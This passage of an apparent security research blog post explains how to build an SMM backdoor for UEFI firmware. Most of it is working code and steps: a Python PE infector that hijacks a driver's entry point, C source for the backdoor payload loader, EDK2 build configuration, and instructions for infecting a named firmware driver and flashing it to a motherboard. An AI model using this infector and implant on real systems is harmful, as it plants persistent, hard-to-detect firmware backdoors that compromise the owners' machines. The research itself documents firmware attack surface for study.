        &amp;gEfiSmmBase2ProtocolGuid,
        0i64,
        &amp;gEfiSmmBase2Protocol
    );
    <span style="color: #7f0055; font-weight: bold;">if</span> (v4 &amp; 0x8000000000000000)
    {
        <span style="color: #7f0055; font-weight: bold;">if</span> (v4 != 0x800000000000000E)
        {
            <span style="color: #7f0055; font-weight: bold;">return</span> 3;
        }

        bInSmm = 0;

        <span style="color: #3f7f59;">// EFI_SMM_BASE2_PROTOCOL was not found, do the DXE stuff</span>
        <span style="color: #7f0055; font-weight: bold;">return</span> sub_180001F54(v3, v2);
    }

    gEfiSmmBase2Protocol-&gt;InSmm(gEfiSmmBase2Protocol, &amp;bInSmm);
    <span style="color: #7f0055; font-weight: bold;">if</span> (!bInSmm)
    {
        <span style="color: #3f7f59;">// EFI_SMM_BASE2_PROTOCOL found but we are not in SMM, do the DXE stuff</span>
        <span style="color: #7f0055; font-weight: bold;">return</span> sub_180001F54(v3, v2);
    }

    <span style="color: #3f7f59;">// driver loaded into SMRAM, do the SMM stuff</span>
    <span style="color: #7f0055; font-weight: bold;">return</span> sub_180001ED8(v3, v2);
}

<span style="color: #7f0055; font-weight: bold;">int</span> <span style="color: #7f0055; font-weight: bold;">__fastcall</span> sub_180001ED8(<span style="color: #7f0055; font-weight: bold;">void</span> *a1, EFI_SYSTEM_TABLE *a2)
{
    <span style="color: #7f0055; font-weight: bold;">__int64</span> v2; <span style="color: #3f7f59;">// rax@1</span>
    <span style="color: #7f0055; font-weight: bold;">__int64</span> v3; <span style="color: #3f7f59;">// rax@3</span>

    <span style="color: #3f7f59;">// perform various SMM initializations</span>
    LODWORD(v2) = sub_1800021D8(a1, a2);

    <span style="color: #7f0055; font-weight: bold;">if</span> (!(v2 &amp; 0x8000000000000000))
    {
        LODWORD(v2) = sub_180000610(1);

        <span style="color: #7f0055; font-weight: bold;">if</span> (!(v2 &amp; 0x8000000000000000))
        {
            <span style="color: #3f7f59;">// get location of System Management Service Table</span>
            LODWORD(v3) = gEfiSmmBase2Protocol-&gt;GetSmstLocation(
                gEfiSmmBase2Protocol,
                &amp;gSMST
            );
            <span style="color: #7f0055; font-weight: bold;">if</span> (v3 &amp; 0x8000000000000000 || !gSMST)
            {
                <span style="color: #3f7f59;">// error: unable to locate SMST</span>
                LODWORD(v2) = 3;
            }
            <span style="color: #7f0055; font-weight: bold;">else</span>
            {
                <span style="color: #3f7f59;">// do the rest of SMM stuff</span>
                <span style="color: #3f7f59;">// ...</span>
            }
        }
    }

    <span style="color: #7f0055; font-weight: bold;">return</span> v2;
}
</pre>
<br>
As you can see, entry point of this module calls <span style="font-family: Courier New, Courier, monospace;">sub_180002074()</span> function that initializes global variables, <span style="font-family: Courier New, Courier, monospace;">sub_180001FD0()</span> is using <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_BASE2_PROTOCOL.InSmm()</span> to determinate that driver runs in SMM mode and if yes — it locates SMST with <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_BASE2_PROTOCOL.GetSmstLocation()</span> and continues to do various SMM related stuff. When driver was loaded as DXE — <span style="font-family: Courier New, Courier, monospace;">sub_180001F54()</span> is being called to perform DXE related operations and <span style="font-family: Courier New, Courier, monospace;">sub_180001ED8()</span> is used when driver was loaded in SMM.<br>
<br>
<h3>
Running your code in SMM</h3>
<br>
As it was said, to run some custom code in SMM you need to have a 
hardware programmer, if your board has a COM port — it might be very 
useful for reading the debug output of SMM code.<br>
<br>
On the picture you can see my test setup that was mentioned in previous article:<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://dl.dropboxusercontent.com/u/22903093/blog/uefi-smm-backdoor/test-system.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img src="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/test-system.jpg" style="border: 0px;" height="450" width="721"></a></div>
<br>
When it was clear how SMM/DXE combined driver should work — I wrote a simple hello world driver that uses <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_BASE2_PROTOCOL</span>
 to locate SMST and print it’s address to debug output. First I decided 
to add driver’s image to FFS volume as a new file, but when I flashed my
 test system with updated firmware image — hello world driver wasn’t 
loaded. I still don’t know the exact reason of such behaviour: probably,
 there was something wrong with PE/FFS headers or driver load order 
dependencies. Well, but there’s at least one good thing: modified 
firmware is functioning fine, which means that Intel DQ77KB board is not
 using any custom mechanisms to verify firmware image or FFS volumes 
integrity.<br>
<br>
The next attempt that I decided to try to don’t waste a time on reverse 
engineering and debugging — infect PE image of existing combined driver 
that was featured above.<br>
<br>
Using Python and <a href="https://pypi.python.org/pypi/pefile">pefile library</a>
 I wrote a trivial PE files infector that copies payload PE image to a 
new section of the target image and hooks it’s entry point to execute 
payload on image load:<br>
<pre style="height: 500px; overflow-x: auto; overflow-y: auto; white-space: pre; word-wrap: normal;"><span style="color: #3f7f59;"># see struct _INFECTOR_CONFIG in SmmBackdoor.h</span>
INFECTOR_CONFIG_SECTION = <span style="color: #2a00ff;">'.conf'</span>
INFECTOR_CONFIG_FMT = <span style="color: #2a00ff;">'QI'</span>
INFECTOR_CONFIG_LEN = 8 + 4

<span style="color: #3f7f59;"># IMAGE_DOS_HEADER.e_res magic constant to mark infected file</span>
INFECTOR_SIGN = <span style="color: #2a00ff;">'INFECTED'</span>

<span style="color: #3f7f59;"># infect src image with payload and optionally save it to dst</span>
<span style="color: #7f0055; font-weight: bold;">def</span> infect(src, payload, dst = None):

    <span style="color: #7f0055; font-weight: bold;">import</span> pefile

    <span style="color: #7f0055; font-weight: bold;">def</span> _infector_config_offset(pe):
        
        <span style="color: #7f0055; font-weight: bold;">for</span> section <span style="color: #7f0055; font-weight: bold;">in</span> pe.sections:

            <span style="color: #3f7f59;"># find .conf section of payload image</span>
            <span style="color: #7f0055; font-weight: bold;">if</span> section.Name[: <span style="color: #7f0055; font-weight: bold;">len</span>(INFECTOR_CONFIG_SECTION)] == INFECTOR_CONFIG_SECTION:

                <span style="color: #7f0055; font-weight: bold;">return</span> section.PointerToRawData

        <span style="color: #7f0055; font-weight: bold;">raise</span> Exception(<span style="color: #2a00ff;">'Unable to find %s section'</span> % INFECTOR_CONFIG_SECTION)

    <span style="color: #7f0055; font-weight: bold;">def</span> _infector_config_get(pe, data):

        offs = _infector_config_offset(pe)
        
        <span style="color: #7f0055; font-weight: bold;">return</span> unpack(INFECTOR_CONFIG_FMT, data[offs : offs + INFECTOR_CONFIG_LEN])        

    <span style="color: #7f0055; font-weight: bold;">def</span> _infector_config_set(pe, data, *args):

        offs = _infector_config_offset(pe)

        <span style="color: #7f0055; font-weight: bold;">return</span> data[: offs] + \
               pack(INFECTOR_CONFIG_FMT, *args) + \
               data[offs + INFECTOR_CONFIG_LEN :]

    <span style="color: #3f7f59;"># load target image</span>
    pe_src = pefile.PE(src)

    <span style="color: #3f7f59;"># load payload image</span>
    pe_payload = pefile.PE(payload)
    
    <span style="color: #7f0055; font-weight: bold;">if</span> pe_src.DOS_HEADER.e_res == INFECTOR_SIGN:

        <span style="color: #7f0055; font-weight: bold;">raise</span> Exception(<span style="color: #2a00ff;">'%s is already infected'</span> % src)        

    <span style="color: #7f0055; font-weight: bold;">if</span> pe_src.FILE_HEADER.Machine != pe_payload.FILE_HEADER.Machine:

        <span style="color: #7f0055; font-weight: bold;">raise</span> Exception(<span style="color: #2a00ff;">'Architecture missmatch'</span>)

    <span style="color: #3f7f59;"># read payload image data into the string</span>
    data = <span style="color: #7f0055; font-weight: bold;">open</span>(payload, <span style="color: #2a00ff;">'rb'</span>).read()

    <span style="color: #3f7f59;"># read _INFECTOR_CONFIG, this structure is located at .conf section of payload image</span>
    conf_ep_new, conf_ep_old = _infector_config_get(pe_payload, data)    

    last_section = None
    <span style="color: #7f0055; font-weight: bold;">for</span> section <span style="color: #7f0055; font-weight: bold;">in</span> pe_src.sections:

        <span style="color: #3f7f59;"># find last section of target image</span>
        last_section = section

    <span style="color: #7f0055; font-weight: bold;">if</span> last_section.Misc_VirtualSize &gt; last_section.SizeOfRawData:

        <span style="color: #7f0055; font-weight: bold;">raise</span> Exception(<span style="color: #2a00ff;">'Last section virtual size must be less or equal than raw size'</span>)

    <span style="color: #3f7f59;"># save original entry point address of target image</span>
    conf_ep_old = pe_src.OPTIONAL_HEADER.AddressOfEntryPoint

    <span style="color: #3f7f59;"># write updated _INFECTOR_CONFIG back to the payload image</span>
    data = _infector_config_set(pe_payload, data, conf_ep_new, conf_ep_old)

    <span style="color: #3f7f59;"># set new entry point of target image</span>
    pe_src.OPTIONAL_HEADER.AddressOfEntryPoint = \
        last_section.VirtualAddress + last_section.SizeOfRawData + conf_ep_new

    <span style="color: #3f7f59;"># update last section size</span>
    last_section.SizeOfRawData += <span style="color: #7f0055; font-weight: bold;">len</span>(data)
    last_section.Misc_VirtualSize = last_section.SizeOfRawData

    <span style="color: #3f7f59;"># make it executable</span>
    last_section.Characteristics = pefile.SECTION_CHARACTERISTICS[<span style="color: #2a00ff;">'IMAGE_SCN_MEM_READ'</span>] | \
                                   pefile.SECTION_CHARACTERISTICS[<span style="color: #2a00ff;">'IMAGE_SCN_MEM_WRITE'</span>] | \
                                   pefile.SECTION_CHARACTERISTICS[<span style="color: #2a00ff;">'IMAGE_SCN_MEM_EXECUTE'</span>]

    <span style="color: #3f7f59;"># update image headers</span>
    pe_src.DOS_HEADER.e_res = INFECTOR_SIGN
    pe_src.OPTIONAL_HEADER.SizeOfImage = \
        last_section.VirtualAddress + last_section.Misc_VirtualSize

    <span style="color: #3f7f59;"># get infected image data</span>
    data = pe_src.write() + data

    <span style="color: #7f0055; font-weight: bold;">if</span> dst <span style="color: #7f0055; font-weight: bold;">is</span> <span style="color: #7f0055; font-weight: bold;">not</span> None:

        <span style="color: #7f0055; font-weight: bold;">with</span> <span style="color: #7f0055; font-weight: bold;">open</span>(dst, <span style="color: #2a00ff;">'wb'</span>) <span style="color: #7f0055; font-weight: bold;">as</span> fd:

            <span style="color: #3f7f59;"># save infected image to the file</span>
            fd.write(data)

    <span style="color: #7f0055; font-weight: bold;">return</span> data
</pre>
<br>
As was said, infector payload is just a regular PE image of DXE/SMM 
combined driver. After load this image updates it’s base relocations, 
performs backdoor initialization operations and transfers execution to 
original entry point of infected image (it’s RVA address was saved by 
infector in .conf section of payload image).<br>
<pre style="height: 500px; overflow-x: auto; overflow-y: auto; white-space: pre; word-wrap: normal;"><span style="color: #3f7f59;">// file: SmmBackdoor.c</span>

<span style="color: #3f7f59;">// UEFI SMM foundation headers</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">FrameworkSmm.h</span><span style="color: #2a00ff;">&gt;</span>

<span style="color: #3f7f59;">// required EDK protocols</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">Protocol/LoadedImage.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">Protocol/SmmCpu.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">Protocol/SmmBase2.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">Protocol/SmmAccess2.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">Protocol/SmmSwDispatch2.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">Protocol/SmmPeriodicTimerDispatch2.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">Protocol/DevicePath.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">Protocol/SerialIo.h</span><span style="color: #2a00ff;">&gt;</span>

<span style="color: #3f7f59;">// required EDK libraries</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">Library/UefiDriverEntryPoint.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">Library/UefiBootServicesTableLib.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">Library/DebugLib.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">Library/DevicePathLib.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">Library/UefiRuntimeLib.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">Library/SynchronizationLib.h</span><span style="color: #2a00ff;">&gt;</span>

<span style="color: #3f7f59;">// PE image structures</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">IndustryStandard/PeImage.h</span><span style="color: #2a00ff;">&gt;</span>

<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">"</span><span style="color: #3f3fbf;">config.h</span><span style="color: #2a00ff;">"</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">"</span><span style="color: #3f3fbf;">common.h</span><span style="color: #2a00ff;">"</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">"</span><span style="color: #3f3fbf;">printf.h</span><span style="color: #2a00ff;">"</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">"</span><span style="color: #3f3fbf;">debug.h</span><span style="color: #2a00ff;">"</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">"</span><span style="color: #3f3fbf;">loader.h</span><span style="color: #2a00ff;">"</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">"</span><span style="color: #3f3fbf;">SmmBackdoor.h</span><span style="color: #2a00ff;">"</span>

<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">"</span><span style="color: #3f3fbf;">asm/common_asm.h</span><span style="color: #2a00ff;">"</span>

<span style="color: #3f7f59;">// this function will be used as entry point of infected image</span>
EFI_STATUS
BackdoorEntryInfected(
    EFI_HANDLE ImageHandle,
    EFI_SYSTEM_TABLE *SystemTable
);

<span style="color: #7f0055;">#</span><span style="color: #7f0055; font-weight: bold;">pragma</span><span style="color: #7f0055; font-weight: bold;"> section(</span><span style="color: #2a00ff; font-weight: bold;">".conf"</span><span style="color: #7f0055; font-weight: bold;">, read, write)</span>

<span style="color: #3f7f59;">// PE image section with information for infector</span>
<span style="color: #7f0055; font-weight: bold;">__declspec</span>(<span style="color: #7f0055;">allocate</span>(<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">.conf</span><span style="color: #2a00ff;">"</span>)) INFECTOR_CONFIG m_InfectorConfig = 
{ 
    <span style="color: #3f7f59;">// new entry point address of infected file</span>
    (<span style="color: #7f0055; font-weight: bold;">PVOID</span>)&amp;BackdoorEntryInfected,

    <span style="color: #3f7f59;">// old entry point address (will be set by infector)</span>
    0
};

<span style="color: #3f7f59;">// DXE and runtime phase API</span>
EFI_SYSTEM_TABLE *gST;
EFI_BOOT_SERVICES *gBS;
EFI_RUNTIME_SERVICES *gRT;

<span style="color: #3f7f59;">// SMM phase API</span>
EFI_SMM_SYSTEM_TABLE2 *gSmst = <span style="color: #7f0055; font-weight: bold;">NULL</span>;

<span style="color: #7f0055; font-weight: bold;">BOOLEAN</span> m_bInfectedImage = FALSE;
EFI_HANDLE m_ImageHandle = <span style="color: #7f0055; font-weight: bold;">NULL</span>;
<span style="color: #7f0055; font-weight: bold;">PVOID</span> m_ImageBase = <span style="color: #7f0055; font-weight: bold;">NULL</span>;
<span style="color: #3f7f59;">//--------------------------------------------------------------------------------------</span>
<span style="color: #7f0055; font-weight: bold;">PVOID</span> BackdoorImageAddress(<span style="color: #7f0055; font-weight: bold;">void</span>)
{
    <span style="color: #7f0055; font-weight: bold;">PVOID</span> Addr = _get_addr();
    UINT64 Base = ALIGN_DOWN((UINT64)Addr, DEFAULT_EDK_ALIGN);

    <span style="color: #3f7f59;">// get current module base address by some address inside it</span>
    <span style="color: #7f0055; font-weight: bold;">while</span> (*(<span style="color: #7f0055; font-weight: bold;">PUSHORT</span>)Base != EFI_IMAGE_DOS_SIGNATURE)
    {
        Base -= DEFAULT_EDK_ALIGN;
    }

    <span style="color: #7f0055; font-weight: bold;">return</span> Base;
}
<span style="color: #3f7f59;">//--------------------------------------------------------------------------------------</span>
EFI_STATUS BackdoorImageCallRealEntry(
    <span style="color: #7f0055; font-weight: bold;">PVOID</span> Image,
    EFI_HANDLE ImageHandle,
    EFI_SYSTEM_TABLE *SystemTable)
{
    <span style="color: #7f0055; font-weight: bold;">if</span> (m_InfectorConfig.OriginalEntryPoint != 0)
    {
        EFI_IMAGE_ENTRY_POINT pEntry = (EFI_IMAGE_ENTRY_POINT)RVATOVA(
            Image, 
            m_InfectorConfig.OriginalEntryPoint
        );

        <span style="color: #3f7f59;">// call original entry point</span>
        <span style="color: #7f0055; font-weight: bold;">return</span> pEntry(ImageHandle, SystemTable);
    }

    <span style="color: #7f0055; font-weight: bold;">return</span> EFI_SUCCESS;
}
<span style="color: #3f7f59;">//--------------------------------------------------------------------------------------</span>
<span style="color: #7f0055; font-weight: bold;">VOID</span> BackdoorEntryDxe(<span style="color: #7f0055; font-weight: bold;">VOID</span>)
{
    <span style="color: #3f7f59;">// DXE phase payload code goes here</span>
    <span style="color: #3f7f59;">// ...</span>
}
<span style="color: #3f7f59;">//--------------------------------------------------------------------------------------</span>
<span style="color: #7f0055; font-weight: bold;">VOID</span> BackdoorEntrySmm(<span style="color: #7f0055; font-weight: bold;">VOID</span>)
{
    <span style="color: #3f7f59;">// SMM phase payload code goes here</span>
    <span style="color: #3f7f59;">// ...</span>
}
<span style="color: #3f7f59;">//--------------------------------------------------------------------------------------</span>
EFI_STATUS
BackdoorEntryInfected(
    EFI_HANDLE ImageHandle,
    EFI_SYSTEM_TABLE *SystemTable)
{
    <span style="color: #3f7f59;">// get payload image address</span>
    <span style="color: #7f0055; font-weight: bold;">PVOID</span> Base = BackdoorImageAddress();

    <span style="color: #3f7f59;">// update payload image base relocations</span>
    LdrProcessRelocs(Base, Base);

    <span style="color: #3f7f59;">// after LdrProcessRelocs() call we can use global variables and data</span>
    m_ImageBase = Base;

    <span style="color: #3f7f59;">// call original entry point of payload image</span>
    <span style="color: #7f0055; font-weight: bold;">return</span> BackdoorEntry(
        ImageHandle,
        SystemTable
    );
}
<span style="color: #3f7f59;">//--------------------------------------------------------------------------------------</span>
EFI_STATUS 
BackdoorEntry(
    IN EFI_HANDLE ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable) 
{
    EFI_STATUS Ret = EFI_SUCCESS, Status = EFI_SUCCESS;
    <span style="color: #7f0055; font-weight: bold;">BOOLEAN</span> bInSmram = FALSE;
    <span style="color: #7f0055; font-weight: bold;">PVOID</span> Image = <span style="color: #7f0055; font-weight: bold;">NULL</span>;            

    EFI_LOADED_IMAGE *LoadedImage = <span style="color: #7f0055; font-weight: bold;">NULL</span>;   
    EFI_SMM_BASE2_PROTOCOL *SmmBase = <span style="color: #7f0055; font-weight: bold;">NULL</span>;    

    <span style="color: #7f0055; font-weight: bold;">if</span> (m_ImageHandle == <span style="color: #7f0055; font-weight: bold;">NULL</span>)
    {
        m_ImageHandle = ImageHandle;    

        gST = SystemTable;
        gBS = gST-&gt;BootServices;
        gRT = gST-&gt;RuntimeServices;           

        DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">BackdoorEntry() called</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>);

        <span style="color: #3f7f59;">// get current image information</span>
        gBS-&gt;HandleProtocol(ImageHandle, &amp;gEfiLoadedImageProtocolGuid, (<span style="color: #7f0055; font-weight: bold;">VOID</span> *)&amp;LoadedImage);    
        
        <span style="color: #7f0055; font-weight: bold;">if</span> (m_ImageBase == <span style="color: #7f0055; font-weight: bold;">NULL</span>)
        {
            <span style="color: #3f7f59;">// payload image was loaded as standalone EFI application or driver</span>
            m_bInfectedImage = FALSE;
            m_ImageBase = LoadedImage-&gt;ImageBase;

            DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">Started as standalone driver/app</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>);
        }
        <span style="color: #7f0055; font-weight: bold;">else</span>
        {
            <span style="color: #3f7f59;">// payload image was loaded as infector payload</span>
            m_bInfectedImage = TRUE;

            DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">Started as infector payload</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>);
        }

        DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">Image base address is </span><span style="color: #2a00ff;">"</span>FPTR<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, m_ImageBase);    
    }     

    Status = gBS-&gt;LocateProtocol(&amp;gEfiSmmBase2ProtocolGuid, <span style="color: #7f0055; font-weight: bold;">NULL</span>, (<span style="color: #7f0055; font-weight: bold;">PVOID</span> *)&amp;SmmBase);
    <span style="color: #7f0055; font-weight: bold;">if</span> (Status == EFI_SUCCESS)
    {
        <span style="color: #3f7f59;">// check if infected driver is running in SMM</span>
        SmmBase-&gt;InSmm(SmmBase, &amp;bInSmram);

        <span style="color: #7f0055; font-weight: bold;">if</span> (bInSmram)
        {
            DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">Running in SMM</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>);

            Status = SmmBase-&gt;GetSmstLocation(SmmBase, &amp;gSmst);
            <span style="color: #7f0055; font-weight: bold;">if</span> (Status == EFI_SUCCESS)
            {
                DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">SMM system table is at </span><span style="color: #2a00ff;">"</span>FPTR<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, gSmst);

                <span style="color: #3f7f59;">// run SMM specific code</span>
                BackdoorEntrySmm();
            }   
            <span style="color: #7f0055; font-weight: bold;">else</span>
            {
                DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">GetSmstLocation() fails: 0x</span><span style="color: #2a00ff;">%X</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, Status);
            }
        }                
    }

    <span style="color: #7f0055; font-weight: bold;">if</span> (!bInSmram)
    {
        <span style="color: #3f7f59;">// run DXE specific code</span>
        BackdoorEntryDxe();
    }

    <span style="color: #7f0055; font-weight: bold;">if</span> (m_bInfectedImage)
    {
        <span style="color: #3f7f59;">// call original entry point of infected image</span>
        Ret = BackdoorImageCallRealEntry(LoadedImage-&gt;ImageBase, ImageHandle, SystemTable);
    }    

    <span style="color: #7f0055; font-weight: bold;">return</span> Ret;
}
<span style="color: #3f7f59;">//--------------------------------------------------------------------------------------</span>
<span style="color: #3f7f59;">// EoF</span>
</pre>
<br>
To compile UEFI drivers I’m using previously mentioned EDK2. 
Unfortunately, on my OS X machine it fails to build with compilation 
errors, so, I will compile SMM backdoor driver on Windows machine with 
Visual Studio 2008 installed.<br>
<br>
First of all, we need to clone EDK2 source code tree from <a href="https://github.com/tianocore/edk2">https://github.com/tianocore/edk2 </a>and read build instructions in <span style="font-family: Courier New, Courier, monospace;"><a href="https://github.com/tianocore/edk2/blob/master/BuildNotes2.txt">BuildNotes2.txt</a></span> document. Then we need to edit <span style="font-family: Courier New, Courier, monospace;">Conf/target.txt</span> file and set <span style="font-family: Courier New, Courier, monospace;">ACTIVE_PLATFORM</span> property value to <span style="font-family: Courier New, Courier, monospace;">OvmfPkg/OvmfPkgX64.dsc</span>, directory with the backdoor driver source code (<span style="font-family: Courier New, Courier, monospace;"><a href="https://github.com/Cr4sh/SmmBackdoor/SmmBackdoor">SmmBackdoor</a></span>) should be copied to directory with EDK2 source.<br>
<br>
EDK2 uses it’s own makefile format, for our project we need to have <span style="font-family: Courier New, Courier, monospace;">SmmBackdoor/SmmBackdoor.inf</span> file with the following content:<br>
<pre style="overflow-x: auto; overflow-y: auto; white-space: pre; word-wrap: normal;"># main settings
[defines]
  INF_VERSION = 0x00010005 
  BASE_NAME = SmmBackdoor
  FILE_GUID = 22D5AE41-147E-4C44-AE72-ECD9BBB455C1 # random one
  MODULE_TYPE = DXE_SMM_DRIVER
  ENTRY_POINT = BackdoorEntry

# C sources
[Sources]
  debug.c
  loader.c
  printf.c
  serial.c
  SmmBackdoor.c

# architecture-specific assembly sources
[Sources.X64]
  asm/amd64/common_asm.asm

# required EDK packages
[Packages]
  MdePkg/MdePkg.dec
  MdeModulePkg/MdeModulePkg.dec
  IntelFrameworkPkg/IntelFrameworkPkg.dec  
  IntelFrameworkModulePkg/IntelFrameworkModulePkg.dec  
  StdLib/StdLib.dec

# required EDK libraries
[LibraryClasses]
  UefiDriverEntryPoint
  UefiBootServicesTableLib
  DebugLib
  DevicePathLib
  SynchronizationLib

# required EDK protocols
[Protocols]
  gEfiSimpleTextOutProtocolGuid
  gEfiLoadedImageProtocolGuid
  gEfiSmmCpuProtocolGuid
  gEfiSmmBase2ProtocolGuid
  gEfiSmmAccess2ProtocolGuid
  gEfiSmmSwDispatch2ProtocolGuid
  gEfiSmmPeriodicTimerDispatch2ProtocolGuid
  gEfiDevicePathProtocolGuid
  gEfiSerialIoProtocolGuid  
 
# load order dependencies (none)
[Depex]
  TRUE
</pre>
<br>
Also, you need to edit <span style="font-family: Courier New, Courier, monospace;">OvmfPkg/OvmfPkgX64.dsc</span> and add the following lines at the end of the file:<br>
<pre style="overflow-x: auto; overflow-y: auto; white-space: pre; word-wrap: normal;">  #
  # 3-rd party drivers
  #
  SmmBackdoor/SmmBackdoor.inf {
    &lt;LibraryClasses&gt;
      DebugLib|OvmfPkg/Library/PlatformDebugLibIoPort/PlatformDebugLibIoPort.inf
      MemoryAllocationLib|MdePkg/Library/UefiMemoryAllocationLib/UefiMemoryAllocationLib.inf
  }
</pre>
<br>
To compile <span style="font-family: Courier New, Courier, monospace;">SmmBackdoor</span> project:<br>
<br>
<ol>
<li>Run Visual Studio 2008 Command Prompt and cd to EDK2 directory.</li>
<li>Execute <span style="font-family: Courier New, Courier, monospace;">Edk2Setup.bat --pull</span> to configure build environment and download required binaries.</li>
<li><span style="font-family: Courier New, Courier, monospace;">cd SmmBackdoor &amp;&amp; build</span></li>
<li>After compilation resulting PE image file will be created at <span style="font-family: Courier New, Courier, monospace;">Build/OvmfX64/DEBUG_VS2008x86/X64/SmmBackdoor/SmmBackdoor/OUTPUT/SmmBackdoor.efi</span></li>
</ol>
<br>
To run <span style="font-family: Courier New, Courier, monospace;">SmmBackdoor.efi</span> as infector payload:<br>
<br>
<ol>
<li>Open dumped flash image of test motherboard in UEFITool.</li>
<li>Extract PE image of FFS file with GUID = <span style="font-family: Courier New, Courier, monospace;">26A2481E-4424-46A2-9943-CC4039EAD8F8</span>.</li>
<li>Infect extracted image with <span style="font-family: Courier New, Courier, monospace;">SmmBackdoor.efi</span> using Python infector.</li>
<li>In UEFITool replace original PE image with infected one.</li>
<li>Save modified flash image to file and write it to motherboard ROM 
chip using flashrom and SPI programmer or any other convenient way.</li>
</ol>
<br>
<h3>
Debug messages</h3>
<br>
The tricky part of backdoor development was about getting it’s debug 
output somehow. Basically, there’s a two ways to solve this task:<br>
<br>
<ul>
<li>Write debug output to COM port using I/O registers <span style="font-family: Courier New, Courier, monospace;">3F8h:3FFh</span>.</li>
<li>Write debug output to screen using <span style="font-family: Courier New, Courier, monospace;">EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL</span>.</li>
</ul>
<br>
COM port of Intel DQ77KB board is connected to legacy port controller 
(super I/O) that talks to Q77 Platform Controller Hub (PCH) trough <a href="https://en.wikipedia.org/wiki/Low_Pin_Count">Low Pin Circuit</a> (LPC) bus interface:<br>
<div class="separator" style="clear: both; text-align: center;">
